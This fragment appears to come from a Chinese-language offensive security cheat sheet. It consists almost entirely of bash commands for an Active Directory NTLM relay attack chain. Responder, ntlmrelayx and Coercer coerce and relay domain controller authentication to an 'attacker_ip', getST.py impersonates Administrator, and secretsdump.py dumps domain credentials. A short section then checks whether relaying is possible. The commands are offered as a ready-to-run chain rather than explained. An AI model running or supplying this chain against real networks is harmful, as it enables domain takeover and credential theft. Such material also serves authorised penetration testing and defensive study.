

   ```bash
   # SMB = Off, HTTP = Off
   responder -I eth0 -v
   ```

   ```bash
   ntlmrelayx.py -t ldap://dc01.domain.local --delegate-access
   ```

   ```bash
   coercer coerce -u '' -p '' -d domain.local \
     -l attacker_ip -t dc01.domain.local --always-continue
   ```

   ```bash
   getST.py -spn cifs/dc01.domain.local \
     -impersonate Administrator \
     domain.local/CREATED_MACHINE\$:'password' -dc-ip 10.0.0.1
   ```

   ```bash
   export KRB5CCNAME=Administrator.ccache
   secretsdump.py -k -no-pass dc01.domain.local
   ```


|------|------|---------|------|


```bash
# 完整攻击链一条龙（需要 3 个终端）
# 终端 1: Responder
responder -I eth0 -v

# 终端 2: ntlmrelayx
ntlmrelayx.py -t ldap://dc01.domain.local --delegate-access --escalate-user attacker

# 终端 3: Coercer
coercer coerce -u '' -p '' -d domain.local -l attacker_ip -t dc01.domain.local
```


```bash
# 快速检测 NTLM Relay 可行性
# 1. 检查 SMB 签名
crackmapexec smb 10.0.0.0/24 --gen-relay-list relay_targets.txt

# 2. 检查 LDAP 签名
crackmapexec ldap dc01.domain.local -u '' -p '' -M ldap-checker

# 3. 检查可触发的协议
coercer scan -u user -p pass -d domain.local -t dc01.domain.local
```


- Kali 2026.1, impacket 0.12.0, coercer 2.4.3
